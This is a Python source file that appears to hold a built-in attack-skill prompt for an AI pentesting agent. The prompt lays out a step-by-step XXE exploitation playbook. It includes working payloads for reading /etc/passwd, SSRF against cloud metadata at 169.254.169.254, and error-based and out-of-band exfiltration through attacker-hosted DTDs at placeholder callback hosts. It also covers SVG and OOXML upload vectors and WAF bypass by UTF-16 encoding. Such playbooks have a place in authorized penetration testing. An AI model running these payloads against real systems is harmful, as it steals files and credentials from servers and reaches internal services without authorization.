"""
RedAmon XML External Entity (XXE) Injection Skill Prompts

Built-in attack skill workflow for XXE: coercing a server-side XML parser that
resolves external entities into reading local files, forging server-side
requests, or leaking data in-band, via error messages, or out-of-band.

XXE_TOOLS is injected verbatim (no .format()) by _inject_builtin_skill_workflow
when attack_path_type == "xxe". It therefore uses plain single characters; XML
uses <, >, &, %, ; and never {} so there are no format-brace concerns. Keep it
that way if you edit this file.

The content is a GENERIC playbook written with no target knowledge: every file
path, endpoint, element name, and callback host below is a placeholder or a
universally-present example (e.g. /etc/passwd, /etc/hostname). The agent must
DISCOVER the target's real endpoint, schema, and objective file from the live
target; never hard-code them here.
"""

XXE_TOOLS = """
## XML External Entity (XXE) Injection Workflow

Goal: find an endpoint whose server-side XML parser resolves external entities,
then abuse it to read local files, reach internal services (SSRF), or exfiltrate
data. XXE is a PARSER flaw: it exists wherever attacker-controlled XML is parsed
with entity resolution left on. Work measurement-first - prove each capability
against the live target before escalating, and never declare XXE dead until the
abandonment gate below is satisfied.

### STOP checks (avoid the classic wasted session)
- Do NOT fixate on a login form, a debugger console, or a generic scanner while
  an XML-accepting endpoint sits untested. An `application/xml` / `text/xml`
  response, a SOAP body, a `.wsdl` / `?wsdl` artifact, a file-upload that takes
  SVG / DOCX / XLSX / SAML, or ANY request whose body you can retype as XML is
  the priority surface - probe it first.
- Do NOT conclude "not vulnerable" from one reflected-read attempt. Reflection,
  error-based, and out-of-band are three DIFFERENT oracles; a parser can be
  exploitable through only one of them.
- Do NOT hand-guess payloads with fragile nested shell quoting. Build XML bodies
  with `execute_code` (Python) or a heredoc in `kali_shell` so entities and the
  `%` / `&` characters survive exactly as written.
- Generate every request through the SAME session/auth the endpoint requires
  (authenticate first if it sits behind a login); an unauthenticated 401/403 is
  not evidence the parser is safe.

### Step 1 - Locate the XML attack surface
The XML sink is often a POST endpoint that accepts an XML body and is NOT the
path that advertises a schema. Enumerate and probe:
- Endpoints returning or accepting XML: SOAP / XML-RPC / REST-that-takes-XML,
  `.wsdl`, `/services`, `/api`, `/soap`, `/xmlrpc`, `/rpc`, plus any operation
  or element names hinted by a WSDL, robots.txt, JS, sitemap, or an error page.
- File uploads that accept XML-backed formats: SVG, DOCX / XLSX / PPTX (OOXML),
  ODT, SAML responses, RSS / Atom, GPX, XCF, plist, `.xml` config imports.
- Any request you can convert to XML by switching `Content-Type` (see Step 7).
Tools - reuse recon before you fuzz: `query_graph` to surface Endpoints /
Parameters / Forms already mapped (filter for XML / SOAP content-types or `.wsdl`
/ `.xml` paths); `execute_ffuf` / `execute_katana` against a content-discovery
wordlist to find unlinked service paths; `execute_httpx` to read each candidate's
`Content-Type`. If HTTP capture is on, mine already-observed traffic with
`redamon.search` / `redamon.sitemap` / `redamon.params` for XML requests, then
replay-and-mutate a REAL captured request with `redamon.to_curl` -> `redamon.replay`
(inheriting its exact headers/auth beats hand-rebuilding the request), and pull a
full captured request/response body with `redamon.get`. For a fast automated first
pass, `execute_nuclei` ships XXE detection templates.
Send a minimal well-formed XML document with `Content-Type: application/xml` to
each candidate via `execute_curl` (or `execute_code` for byte-exact bodies) and
READ both the response and the error text: a parse error, a schema/element
complaint, or an echoed field tells you the endpoint parses XML and reveals the
element names it expects.

### Step 2 - Confirm entity substitution with a CONTROL internal entity
Never assume resolution is on. Declare a harmless INTERNAL entity and reference
it in a field the endpoint accepted, then diff the response:
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY probe "XXE_CONTROL_MARKER"> ]>
<r><field>&probe;</field></r>
```
- If `XXE_CONTROL_MARKER` comes back EXPANDED in the response, general-entity
  substitution is ON and in-band reflection is available -> Step 3.
- If it returns literal/stripped but the doc still parses, entity processing may
  be limited to parameter entities or blind -> Steps 5 and 6.
- If the parser rejects the DOCTYPE outright, try XInclude / content-type / file
  upload vectors (Step 7) before giving up.

### Step 3 - In-band file read (classic XXE)
Swap the internal entity for an EXTERNAL `SYSTEM` entity and reference it in a
REFLECTED field. Prove the primitive with a universally-present file first, then
enumerate the objective file (discover its path from the app/config/errors - do
not assume it):
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<r><field>&xxe;</field></r>
```
- Linux proof files: `file:///etc/hostname`, `file:///etc/passwd`.
- Windows proof files: `file:///c:/windows/win.ini`.
- For files with `<`, `&`, or binary bytes that break XML, read them base64 via
  the PHP filter wrapper (PHP targets):
  `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">`
- Java parsers can list a DIRECTORY when the entity points at a folder
  (`file:///etc/`), which helps you discover file names to read next.

### Step 4 - SSRF and internal reach via XXE
The same external entity can fetch a URL instead of a file, turning the parser
into an SSRF primitive:
```
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<r><field>&xxe;</field></r>
```
Use for internal services, cloud metadata (AWS IMDS, `metadata.google.internal`),
and internal port probing. Reflected output gives you the response body; blind
SSRF still confirms reach via your listener (Step 6).

### Step 5 - Error-based exfiltration (when parsing but NOT reflected)
If the doc parses but no field is reflected, coerce the file contents into a
PARSE ERROR message. This uses PARAMETER entities (`%name;`), which only work
inside the DTD. Two variants:

(a) Via an external DTD the target fetches from YOU. Error-based: the file contents
come back INSIDE the parse error, so (a) needs no outbound exfil callback - only a host
the target can reach that RETURNS your DTD body. interactsh only LOGS a hit; it cannot
serve a DTD, so it does not work for (a).
  - **Host it yourself** on your ONE target-reachable inbound port. Two different
    numbers, from the "Pre-Configured Payload Settings" block:
      * the server LISTENS on your handler port - the pool port, or `4444` when a tunnel
        is active (its ReverseListenerBindPort). With ngrok these differ: LPORT is the
        public port, the local bind is 4444.
      * the TARGET's URL is the block's `LHOST:LPORT` (what ngrok/chisel forwards in).
    That port is your reverse handler's: run `jobs` / `ss -ltn` first, and while this
    server runs NO Metasploit handler can bind it, for ANY of your chats - so stop it the
    instant the DTD has been fetched. Author `err.dtd` with `fs_write` FIRST, then serve a
    dedicated folder holding ONLY it (never `/tmp`: execute_code leaves scripts with target
    creds there). Keep python the ONLY backgrounded command (setup joined by `;`, every
    stream redirected, the log OUTSIDE the served folder): backgrounding an `&&` list holds
    kali_shell's output pipe open until its 300 s timeout and makes `$!` the subshell, and a
    log inside the folder is readable by the target:
    `mkdir -p /tmp/xxe_dtd && mv <path of err.dtd> /tmp/xxe_dtd/; python3 -m http.server <listen_port> --directory /tmp/xxe_dtd >/tmp/xxe_dtd.srv.log 2>&1 </dev/null & echo $!`
    then confirm the bind with `curl -s http://127.0.0.1:<listen_port>/err.dtd >/dev/null && echo up`
    (a backgrounded `(... &)` prints "up" even when the bind FAILED), and `kill <that PID>`
    the moment the target has fetched it.
  - **No reachable inbound port:** serve the DTD from a webhook.site / RequestBin-style
    endpoint that returns a body, or skip to the LOCAL-DTD variant (b), which needs no
    hosting at all.
Client body (YOUR-CALLBACK-HOST = the block's `LHOST:LPORT`, or your webhook host):
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-CALLBACK-HOST/err.dtd"> %ext; ]>
<r></r>
```
Remote `err.dtd`:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
The file contents get embedded into a "file not found" path in the error text.

(b) Via a LOCAL DTD already on the target (no outbound egress needed) - redefine
a parameter entity inside a known system DTD (e.g.
`file:///usr/share/xml/fontconfig/fonts.dtd` on many Linux images):
```
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<r></r>
```
Local-DTD error-based is the go-to when the target cannot reach your callback.

### Step 6 - Out-of-band (OOB) exfiltration (fully blind)
When there is no reflection and no useful error, exfiltrate to a listener you
control. This SENDS TARGET DATA to external infrastructure, so only use it when
the engagement permits an attacker callback; prefer in-band / error-based first.
OOB needs a callback that CAPTURES the data in the request. Split the two roles:
  - **Capture oracle - interactsh** (`interactsh-client -server oast.fun -json -v
    > /tmp/oast-RUN.log 2>&1 &`): its domain goes INSIDE the DTD's exfil entity
    (`http://OAST/?x=%file;`); it logs the query string with your data. It does NOT serve
    the DTD. Replace `RUN` with a short random token you pick once for this workflow (for
    example the output of `openssl rand -hex 4`) and reuse it in every file name: all your
    chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks
    as this one's.
  - **The DTD itself** must still be fetched by the target. Either host `oob.dtd` on your
    ONE reachable port (the server LISTENS on your handler port - the pool port, or `4444`
    with a tunnel; the TARGET's URL is the block's `LHOST:LPORT`; same handler-port warning
    and the exact start form of Step 5a: python alone in the background, log outside the
    served folder, then `curl` and `kill`; dedicated folder, never `/tmp`),
    OR - with no reachable port - use the LOCAL-DTD variant (b) above with its exfil entity
    pointing at `http://OAST/?x=%file;`. The local-DTD route needs no hosting and interactsh
    still captures the data. A webhook.site-style endpoint that returns a body is a third
    host for the DTD when you have no reachable port.
Author the remote `oob.dtd` with `fs_write`, then tail the interactsh / callback log to
read the exfiltrated data:
Client body (DTD-HOST = where you serve oob.dtd: your `LHOST:LPORT`, a webhook host, or
drop it for the local-DTD route):
```
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://DTD-HOST/oob.dtd">
<r>&send;</r>
```
Remote `oob.dtd` (the exfil entity points at the OAST capture host, not the DTD host):
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://OAST/?x=%file;'>">
%all;
```
Read the exfiltrated data from your listener log. For multi-line or binary files
wrap the source in `php://filter/convert.base64-encode/...`, and prefer an
`ftp://` callback if `http://` truncates on newlines.

### Step 7 - Alternate delivery when a plain DOCTYPE is blocked
- Content-type switch: retype a JSON or form POST as XML. Change
  `Content-Type: application/json` to `application/xml` (or `text/xml`) and send
  an equivalent XML document carrying the DOCTYPE + entity.
- XInclude (DOCTYPE stripped but you control a data value inside server-composed
  XML): no DOCTYPE needed -
  ```
  <r xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </r>
  ```
- SOAP body that filters DOCTYPE: wrap it in CDATA so the outer parser passes it
  to an inner parser -
  `<soap:Body><x><![CDATA[<!DOCTYPE d [<!ENTITY % p SYSTEM "http://YOUR-CALLBACK-HOST/">%p;]><y/>]]></x></soap:Body>`
- File-upload XXE: inject the DOCTYPE into the XML inside the uploaded artifact.
  - SVG (in-band): `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>`
    then reference `&xxe;` inside a `<text>` element; useful when the app
    rasterizes or echoes the SVG.
  - OOXML (DOCX / XLSX / PPTX): unzip with `kali_shell` (`unzip`), inject the
    external-DTD OOB payload into `word/document.xml` or `xl/workbook.xml`, then
    rezip and upload. Use the Step 6 OOB or Step 5 error technique to read data.

### Protocol and wrapper reference
- `file://` - local file read (and directory listing on Java parsers).
- `http(s)://` - SSRF, external-DTD fetch, OOB callback.
- `php://filter/convert.base64-encode/resource=...` - PHP source / binary-safe read.
- `ftp://` - OOB channel with no HTTP line-length truncation.
- `jar:` (Java), `netdoc:` (Java), `gopher://`, `expect://`, `data:` - situational,
  parser-dependent; try when `file://` / `http://` are filtered.

### WAF / filter bypass
- Re-encode the whole body to UTF-16 (BE or LE, with BOM) to slip signature WAFs:
  `kali_shell: iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml`.
- Vary DOCTYPE whitespace/case, use a public DTD declaration, or nest the DOCTYPE
  in CDATA (SOAP). Parameter-entity payloads dodge filters that only block the
  literal `SYSTEM` in general entities.

### Parser notes (why a target may or may not be vulnerable)
- libxml2 < 2.9 resolves external entities by DEFAULT; >= 2.9 needs them
  explicitly enabled. PHP's DOMDocument/SimpleXML are exposed when loaded with
  `LIBXML_NOENT`. Default Java parsers (SAXParser, DocumentBuilder, older JAXB)
  are frequently vulnerable. .NET `XmlDocument`/`XmlReader` before 4.5.2 resolve
  DTDs by default. This informs which oracle (reflected / error / OOB) and which
  protocol to reach for; still confirm empirically.
- Billion-laughs / entity-expansion is a DoS, not disclosure - do NOT fire it on
  a target you must keep available; it belongs to the denial_of_service skill.

### Abandonment gate (do not declare XXE dead until ALL are true)
1. At least one endpoint accepted and PARSED your XML (Step 1 confirmed).
2. The Step 2 control-entity probe was run against it.
3. You tried in-band read (Step 3), error-based (Step 5), AND at least one blind
   OOB attempt (Step 6) - or documented why an oracle was unreachable.
4. You tried at least one alternate delivery vector (Step 7) if a plain DOCTYPE
   was rejected.
A single 404/500 on one guessed path is NOT "XXE ruled out."

### When to transition phases
While in the informational phase, use recon tools to enumerate XML endpoints,
upload points, and content-types. As soon as you have a concrete XML sink to
attack, call `action="transition_phase"` to move to exploitation.

### Reporting guidelines
Report: the vulnerable endpoint and parameter/field, the working oracle
(reflected / error-based / OOB), the exact payload that worked (and the external
DTD if used), the file(s) read or internal host(s) reached, the recovered
evidence (flag / secret / file contents), and a remediation note (disable
external entity + DTD processing, or set the parser to a no-network, no-DOCTYPE
configuration).
"""
